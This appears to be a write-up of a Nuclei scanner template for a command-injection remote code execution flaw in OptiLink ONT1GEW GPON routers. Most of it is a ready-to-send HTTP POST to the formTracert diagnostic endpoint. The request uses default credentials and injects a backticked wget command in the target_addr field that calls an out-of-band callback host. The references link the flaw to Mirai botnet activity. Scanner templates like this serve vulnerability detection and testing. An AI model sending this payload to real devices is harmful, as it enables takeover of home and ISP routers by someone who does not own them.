# Nuclei Template: OptiLink ONT1GEW GPON Remote Code Execution
**Template ID:** optilink-ont1gew-gpon-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`optilink-ont1gew-gpon-rce.yaml`)

## Vulnerability Information & PoC

## Description
OptiLink is susceptible to remote code execution vulnerabilities which could allow an authenticated, remote attacker to perform command injection attacks against an affected device.

## Steps to reproduce / Exploit Payload
```http
POST /boaform/admin/formTracert HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/diag_ping_admin_en.asp
User: e8c
Password: e8c

target_addr="1.1.1.1+`wget+http%3A%2F%2F{{interactsh-url}}%2F`"&waninf=127.0.0.1"
```

## References
- https://packetstormsecurity.com/files/162993/OptiLink-ONT1GEW-GPON-2.1.11_X101-Remote-Code-Execution.html
- https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
